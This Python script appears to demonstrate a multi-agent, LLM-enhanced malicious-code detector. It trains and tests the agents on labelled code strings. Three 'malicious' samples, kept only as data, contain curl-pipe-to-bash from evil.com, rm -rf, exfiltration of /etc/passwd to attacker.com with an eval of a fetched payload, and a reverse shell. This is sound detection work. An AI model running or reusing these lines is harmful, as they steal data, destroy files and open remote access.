"""
All Agents Demo with LLM Enhancement

Demonstrates IMMUNOS-MCP with local Ollama models:
1. Tests Ollama connectivity
2. Runs all 6 immune agents (B Cell, NK Cell, T Cell, Dendritic, Macrophage, QML)
3. Compares baseline (simple) vs LLM-enhanced performance
4. Shows detailed explanations and vulnerability detection

Requirements:
- Ollama installed with models: qwen2.5-coder:7b, deepseek-r1:14b, qwen2.5:1.5b
- Run: ./examples/setup_ollama.sh
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
sys.path.insert(0, str(Path(__file__).parent))  # Add examples dir to path

import time
from typing import Any, Dict, List, Tuple

import numpy as np

# LLM-enhanced agents
from llm_enhanced_agents import (
    LLMEnhancedBCellAgent,
    LLMEnhancedDendriticAgent,
    LLMEnhancedMacrophageAgent,
    LLMEnhancedNKCellAgent,
    LLMEnhancedQMLAgent,
    LLMEnhancedTCellAgent,
    is_ollama_available,
)

# Core IMMUNOS imports
from immunos_mcp.core.antigen import Antigen, DataType

# ==============================================================================
# Sample Code for Testing
# ==============================================================================

# Safe code samples
SAFE_SAMPLES = [
    """
def calculate_sum(numbers):
    '''Calculate sum of numbers'''
    return sum(numbers)

result = calculate_sum([1, 2, 3, 4, 5])
print(f"Sum: {result}")
""",
    """
import json

def load_config(filepath):
    '''Load configuration from JSON file'''
    with open(filepath, 'r') as f:
        config = json.load(f)
    return config

config = load_config('config.json')
""",
    """
class DataProcessor:
    def __init__(self, data):
        self.data = data

    def process(self):
        return [x * 2 for x in self.data]

processor = DataProcessor([1, 2, 3])
result = processor.process()
""",
]

# Vulnerable/malicious code samples
MALICIOUS_SAMPLES = [
    """
import subprocess
import os

def backdoor(cmd):
    '''Execute arbitrary system commands'''
    return subprocess.check_output(cmd, shell=True)

# Execute commands from remote server
result = backdoor("curl http://evil.com/steal_data.sh | bash")
os.system("rm -rf /important_data")
""",
    """
def steal_credentials():
    '''Exfiltrate sensitive data'''
    import requests

    # Read password files
    with open('/etc/passwd', 'r') as f:
        passwords = f.read()

    # Send to attacker
    requests.post('http://attacker.com/collect', data=passwords)

    # Execute payload
    eval(requests.get('http://attacker.com/payload').text)

steal_credentials()
""",
    """
import socket

def reverse_shell(host, port):
    '''Create reverse shell for remote access'''
    s = socket.socket()
    s.connect((host, port))

    while True:
        cmd = s.recv(1024).decode()
        if cmd == 'exit':
            break
        output = eval(cmd)  # Dangerous eval
        s.send(str(output).encode())

reverse_shell('attacker.com', 4444)
""",
]


# ==============================================================================
# Demo Functions
# ==============================================================================


def print_header(text: str, char: str = "="):
    """Print formatted header."""
    print("\n" + char * 70)
    print(text)
    print(char * 70 + "\n")


def print_section(text: str):
    """Print section header."""
    print(f"\n{'─' * 70}")
    print(f"  {text}")
    print("─" * 70)


def test_ollama_connectivity() -> bool:
    """Test Ollama connectivity and models."""
    print_header("Test 1: Ollama Connectivity Check")

    if not is_ollama_available():
        print("❌ Ollama is NOT available")
        print("\nPlease install and start Ollama:")
        print("  1. Run: ./examples/setup_ollama.sh")
        print("  2. Or verify: python examples/verify_ollama.py")
        return False

    print("✅ Ollama is available and running")

    # Try to check models
    try:
        import ollama

        models = ollama.list()
        model_names = [m["name"] for m in models.get("models", [])]

        print(f"\n📦 Installed models: {len(model_names)}")
        for name in model_names[:5]:
            print(f"   • {name}")

        required = ["qwen2.5-coder:7b", "deepseek-r1:14b", "qwen2.5:1.5b"]
        missing = [m for m in required if not any(m in name for name in model_names)]

        if missing:
            print(f"\n⚠️  Missing recommended models: {', '.join(missing)}")
            print("   Run: ./examples/setup_ollama.sh")
            return False

        print("\n✅ All required models are installed")
        return True

    except Exception as e:
        print(f"⚠️  Error checking models: {e}")
        return True  # Continue anyway


def run_baseline_demo(
    train_samples: List[str],
    train_labels: List[str],
    test_samples: List[str],
    test_labels: List[str],
) -> Dict[str, Any]:
    """
    Run baseline demo without LLM enhancement.

    Returns:
        Results dictionary
    """
    print_header("Baseline Mode: Simple Embeddings (No LLM)")

    start_time = time.time()
    results = {"mode": "baseline", "predictions": [], "correct": 0, "total": len(test_samples)}

    # Create training antigens
    train_antigens = [
        Antigen(data=sample, data_type=DataType.CODE, class_label=label, identifier=f"train_{i}")
        for i, (sample, label) in enumerate(zip(train_samples, train_labels))
    ]

    # Simple B Cell for baseline
    print("🔬 Initializing B Cell agent...")
    bcell = LLMEnhancedBCellAgent(agent_name="baseline_bcell", affinity_method="traditional")
    bcell.llm_available = False  # Disable LLM for baseline
    bcell.train(train_antigens)

    # Test on samples
    print(f"\n📊 Testing on {len(test_samples)} samples...\n")

    for i, (sample, true_label) in enumerate(zip(test_samples, test_labels)):
        test_antigen = Antigen(data=sample, data_type=DataType.CODE, identifier=f"test_{i}")

        result = bcell.recognize(test_antigen, explain=False)

        is_correct = result.predicted_class == true_label
        if is_correct:
            results["correct"] += 1

        results["predictions"].append(
            {
                "sample_id": i,
                "predicted": result.predicted_class,
                "true_label": true_label,
                "confidence": result.confidence,
                "correct": is_correct,
            }
        )

        status = "✓" if is_correct else "✗"
        print(
            f"  {status} Sample {i+1}: Predicted={result.predicted_class}, "
            f"Actual={true_label}, Confidence={result.confidence:.2%}"
        )

    elapsed = time.time() - start_time
    results["execution_time"] = elapsed
    results["accuracy"] = results["correct"] / results["total"]

    print(
        f"\n📈 Baseline Accuracy: {results['accuracy']:.1%} ({results['correct']}/{results['total']})"
    )
    print(f"⏱️  Execution Time: {elapsed:.2f}s")

    return results


def run_llm_enhanced_demo(
    train_samples: List[str],
    train_labels: List[str],
    test_samples: List[str],
    test_labels: List[str],
) -> Dict[str, Any]:
    """
    Run demo with LLM enhancement showing all agents.

    Returns:
        Results dictionary
    """
    print_header("Enhanced Mode: LLM-Powered Agents", char="=")

    if not is_ollama_available():
        print("⚠️  Ollama not available. Skipping LLM demo.")
        return {"mode": "llm_enhanced", "skipped": True}

    start_time = time.time()
    results = {
        "mode": "llm_enhanced",
        "predictions": [],
        "correct": 0,
        "total": len(test_samples),
        "agents": {},
    }

    # Initialize all agents
    print("🔬 Initializing all 6 immune system agents with LLM models...\n")

    agents = {
        "bcell": LLMEnhancedBCellAgent(agent_name="llm_bcell", llm_model="qwen2.5-coder:7b"),
        "nkcell": LLMEnhancedNKCellAgent(agent_name="llm_nkcell", llm_model="deepseek-r1:14b"),
        "tcell": LLMEnhancedTCellAgent(agent_name="llm_tcell", llm_model="deepseek-r1:14b"),
        "dendritic": LLMEnhancedDendriticAgent(
            agent_name="llm_dendritic", llm_model="qwen2.5-coder:7b"
        ),
        "macrophage": LLMEnhancedMacrophageAgent(
            agent_name="llm_macrophage", llm_model="qwen2.5:1.5b"
        ),
        "qml": LLMEnhancedQMLAgent(agent_name="llm_qml", llm_model="deepseek-r1:14b"),
    }

    print("✅ B Cell Agent (Pattern Matching) - qwen2.5-coder:7b")
    print("✅ NK Cell Agent (Anomaly Detection) - deepseek-r1:14b")
    print("✅ T Cell Agent (Coordination) - deepseek-r1:14b")
    print("✅ Dendritic Agent (Feature Extraction) - qwen2.5-coder:7b")
    print("✅ Macrophage Agent (Triage) - qwen2.5:1.5b")
    print("✅ QML Agent (Qualitative Learning) - deepseek-r1:14b")

    # Train agents
    print("\n📚 Training agents...")

    # B Cell training
    train_antigens = [
        Antigen(data=sample, data_type=DataType.CODE, class_label=label, identifier=f"train_{i}")
        for i, (sample, label) in enumerate(zip(train_samples, train_labels))
    ]
    agents["bcell"].train(train_antigens)

    # NK Cell baseline learning
    normal_samples = [s for s, l in zip(train_samples, train_labels) if l == "safe"]
    agents["nkcell"].learn_baseline(normal_samples)

    # QML model learning
    qml_model = agents["qml"].learn_behavior_model(train_samples, train_labels)

    print("✅ All agents trained\n")

    # Test on samples
    print(f"📊 Testing on {len(test_samples)} samples with full agent coordination...\n")

    for i, (sample, true_label) in enumerate(zip(test_samples, test_labels)):
        print(f"\n{'═' * 70}")
        print(f"  Sample {i+1}/{len(test_samples)}: {true_label}")
        print("═" * 70)

        test_antigen = Antigen(data=sample, data_type=DataType.CODE, identifier=f"test_{i}")

        # 1. Macrophage triage
        triage = agents["macrophage"].triage(sample)
        print(f"\n🔍 Macrophage Triage:")
        print(f"   Priority: {triage['priority'].upper()}")
        print(f"   Category: {triage['category']}")
        if "llm_triage" in triage:
            print(f"   LLM: {triage['llm_triage']}")

        # 2. Dendritic feature extraction
        test_antigen = agents["dendritic"].process_antigen(test_antigen)
        print(f"\n🧬 Dendritic Features Extracted:")
        for key, value in list(test_antigen.features.items())[:5]:
            print(f"   • {key}: {value}")

        # 3. B Cell recognition
        bcell_result = agents["bcell"].recognize(test_antigen, explain=True)
        print(f"\n🎯 B Cell Recognition:")
        print(f"   Predicted: {bcell_result.predicted_class}")
        print(f"   Confidence: {bcell_result.confidence:.2%}")
        print(f"   Explanation: {bcell_result.explanation[:150]}...")

        # 4. NK Cell anomaly detection
        nk_result = agents["nkcell"].recognize(test_antigen, explain=True)
        print(f"\n⚠️  NK Cell Anomaly Detection:")
        print(f"   Result: {nk_result.predicted_class.upper()}")
        print(f"   Confidence: {nk_result.confidence:.2%}")
        print(f"   Reason: {nk_result.explanation[:150]}...")

        # 5. QML qualitative reasoning
        qml_result = agents["qml"].recognize(test_antigen, qml_model)
        print(f"\n📐 QML Qualitative Model:")
        print(f"   Classification: {qml_result.predicted_class}")
        print(f"   Confidence: {qml_result.confidence:.2%}")

        # 6. T Cell coordination
        coord_result = agents["tcell"].coordinate(
            test_antigen, [bcell_result, nk_result, qml_result], explain=True
        )

        print(f"\n🤝 T Cell Coordination:")
        print(f"   Final Decision: {coord_result.predicted_class.upper()}")
        print(f"   Confidence: {coord_result.confidence:.2%}")
        print(f"   Coordination: {coord_result.explanation[:200]}...")

        # Record result
        is_correct = coord_result.predicted_class == true_label
        if is_correct:
            results["correct"] += 1

        results["predictions"].append(
            {
                "sample_id": i,
                "predicted": coord_result.predicted_class,
                "true_label": true_label,
                "confidence": coord_result.confidence,
                "correct": is_correct,
                "triage": triage,
                "agents": {
                    "bcell": bcell_result.predicted_class,
                    "nkcell": nk_result.predicted_class,
                    "qml": qml_result.predicted_class,
                    "tcell": coord_result.predicted_class,
                },
            }
        )

        status = "✅" if is_correct else "❌"
        print(
            f"\n{status} {'CORRECT' if is_correct else 'INCORRECT'}: "
            f"Predicted={coord_result.predicted_class}, Actual={true_label}"
        )

    elapsed = time.time() - start_time
    results["execution_time"] = elapsed
    results["accuracy"] = results["correct"] / results["total"]

    print(f"\n{'═' * 70}")
    print(
        f"📈 LLM-Enhanced Accuracy: {results['accuracy']:.1%} ({results['correct']}/{results['total']})"
    )
    print(f"⏱️  Execution Time: {elapsed:.2f}s")
    print("═" * 70)

    return results


def print_comparison(baseline_results: Dict[str, Any], llm_results: Dict[str, Any]):
    """Print comparison of baseline vs LLM results."""
    print_header("Comparison: Baseline vs LLM-Enhanced")

    if llm_results.get("skipped"):
        print("⚠️  LLM demo was skipped (Ollama not available)")
        return

    # Accuracy comparison
    print("📊 Accuracy:")
    print(f"   Baseline:      {baseline_results['accuracy']:.1%}")
    print(f"   LLM-Enhanced:  {llm_results['accuracy']:.1%}")

    improvement = llm_results["accuracy"] - baseline_results["accuracy"]
    if improvement > 0:
        print(f"   Improvement:   +{improvement:.1%} ✨")
    elif improvement < 0:
        print(f"   Change:        {improvement:.1%}")
    else:
        print(f"   Change:        No difference")

    # Time comparison
    print(f"\n⏱️  Execution Time:")
    print(f"   Baseline:      {baseline_results['execution_time']:.2f}s")
    print(f"   LLM-Enhanced:  {llm_results['execution_time']:.2f}s")

    slowdown = llm_results["execution_time"] / baseline_results["execution_time"]
    print(f"   Slowdown:      {slowdown:.1f}x")

    # Per-sample comparison
    print(f"\n🔍 Per-Sample Analysis:")
    print(f"{'Sample':<10} {'Baseline':<12} {'LLM':<12} {'Actual':<12} {'Status':<10}")
    print("─" * 70)

    for i in range(len(baseline_results["predictions"])):
        base_pred = baseline_results["predictions"][i]
        llm_pred = llm_results["predictions"][i]

        base_correct = "✓" if base_pred["correct"] else "✗"
        llm_correct = "✓" if llm_pred["correct"] else "✗"

        status = ""
        if llm_pred["correct"] and not base_pred["correct"]:
            status = "LLM Better"
        elif base_pred["correct"] and not llm_pred["correct"]:
            status = "Base Better"
        elif llm_pred["correct"] and base_pred["correct"]:
            status = "Both Correct"
        else:
            status = "Both Wrong"

        print(
            f"{i+1:<10} {base_pred['predicted']:<12} {llm_pred['predicted']:<12} "
            f"{base_pred['true_label']:<12} {status:<10}"
        )

    print("\n💡 Key Findings:")
    print(f"   • LLM agents provide detailed explanations")
    print(f"   • Multi-agent coordination improves robustness")
    print(f"   • Triage and feature extraction add context")
    print(f"   • Trade-off: {slowdown:.1f}x slower but {improvement:.1%} more accurate")


def main():
    """Main demo function."""
    print_header("IMMUNOS-MCP: All Agents Demo with Local LLM", char="=")
    print("Demonstrating 6 immune system agents with Ollama integration")
    print("Configuration: 16GB Laptop")
    print()

    # Test connectivity first
    ollama_ok = test_ollama_connectivity()

    # Prepare data
    all_samples = SAFE_SAMPLES + MALICIOUS_SAMPLES
    all_labels = ["safe"] * len(SAFE_SAMPLES) + ["malicious"] * len(MALICIOUS_SAMPLES)

    # Split into train/test
    train_samples = [SAFE_SAMPLES[0], SAFE_SAMPLES[1], MALICIOUS_SAMPLES[0], MALICIOUS_SAMPLES[1]]
    train_labels = ["safe", "safe", "malicious", "malicious"]

    test_samples = [SAFE_SAMPLES[2], MALICIOUS_SAMPLES[2]]
    test_labels = ["safe", "malicious"]

    print(f"\n📦 Dataset:")
    print(
        f"   Training: {len(train_samples)} samples ({train_labels.count('safe')} safe, {train_labels.count('malicious')} malicious)"
    )
    print(
        f"   Testing:  {len(test_samples)} samples ({test_labels.count('safe')} safe, {test_labels.count('malicious')} malicious)"
    )

    # Run baseline
    baseline_results = run_baseline_demo(train_samples, train_labels, test_samples, test_labels)

    # Run LLM-enhanced (if Ollama available)
    llm_results = run_llm_enhanced_demo(train_samples, train_labels, test_samples, test_labels)

    # Compare results
    print_comparison(baseline_results, llm_results)

    # Final summary
    print_header("Demo Complete! 🎉")

    if ollama_ok and not llm_results.get("skipped"):
        print("✅ All agents demonstrated successfully")
        print("✅ LLM enhancement working")
        print("✅ Vulnerability detection operational")
        print("\n🚀 Next steps:")
        print("   • Try your own code samples")
        print("   • Adjust model parameters in llm_enhanced_agents.py")
        print("   • See docs/Model-Selection-By-Agent-Role.md for optimization")
    else:
        print("⚠️  LLM features not fully tested")
        print("\n🔧 To enable LLM features:")
        print("   1. Run: ./examples/setup_ollama.sh")
        print("   2. Verify: python examples/verify_ollama.py")
        print("   3. Re-run this demo")

    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Demo interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n❌ Error: {e}")
        import traceback

        traceback.print_exc()
        sys.exit(1)
